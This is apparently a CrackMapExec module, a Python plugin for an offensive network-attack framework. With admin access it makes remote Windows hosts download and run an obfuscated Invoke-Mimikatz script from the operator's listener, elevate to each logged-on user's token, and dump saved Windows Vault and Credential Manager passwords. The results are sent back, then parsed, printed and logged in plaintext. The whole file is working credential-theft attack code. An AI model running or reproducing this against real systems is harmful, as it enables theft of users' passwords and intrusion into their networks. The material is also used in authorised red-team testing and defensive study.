from cme.helpers.powershell import *
from cme.helpers.logger import write_log
from datetime import datetime
from io import StringIO

class CMEModule:
    '''
        Executes PowerSploit's Invoke-Mimikatz.ps1 script and decrypts stored credentials in Windows Vault/Credential Manager
        Module by @byt3bl33d3r
    '''

    name = 'mimikatz_enum_vault_creds'
    description = "Decrypts saved credentials in Windows Vault/Credential Manager"
    opsec_safe = True
    multiple_hosts = True
    supported_protocols = ['smb', 'mssql']

    def options(self, context, module_options):
        '''
        '''

        self.ps_script = obfs_ps_script('powersploit/Exfiltration/Invoke-Mimikatz.ps1')

    def on_admin_login(self, context, connection):
        command = "Invoke-Mimikatz -Command 'privilege::debug"
        users = []

        loggedon_users = connection.loggedon_users()
        for user in loggedon_users:
            if not user.wkui1_username.endswith('$'):
                users.append(user.wkui1_username)

        if not users:
            context.log.error('No logged in users!')
            return

        for user in users:
            command += ' "token::elevate /user:{}" vault::list'.format(user)
        command += " exit'"

        launcher = gen_ps_iex_cradle(context, 'Invoke-Mimikatz.ps1', command)

        connection.ps_execute(launcher)
        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'Invoke-Mimikatz.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script.encode())

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.get('content-length'))
        data = response.rfile.read(length).decode()

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data):
            buf = StringIO(data).readlines()
            creds = []

            try:
                i = 0
                while i < len(buf):
                    if ('Ressource' in buf[i]):
                        url  = buf[i].split(':', 1)[1].strip().replace('[STRING]', '')
                        user = buf[i+1].split(':', 1)[1].strip().replace('[STRING]', '')
                        passw = buf[i+4].split(':', 1)[1].strip().replace('[STRING]', '')

                        if '[BYTE*]' not in passw:
                            creds.append({'url': url, 'user': user, 'passw': passw})

                    i += 1
            except:
                context.log.error('Error parsing Mimikatz output, please check log file manually for possible credentials')

            if creds:
                context.log.success('Found saved Vault credentials:')
                for cred in creds:
                    if cred['user'] and cred['passw']:
                        context.log.highlight('URL: ' + cred['url'])
                        context.log.highlight('Username: ' + cred['user'])
                        context.log.highlight('Password: ' + cred['passw'])
                        context.log.highlight('')

            log_name = 'EnumVaultCreds-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
            write_log(data, log_name)
            context.log.info("Saved Mimikatz's output to {}".format(log_name))
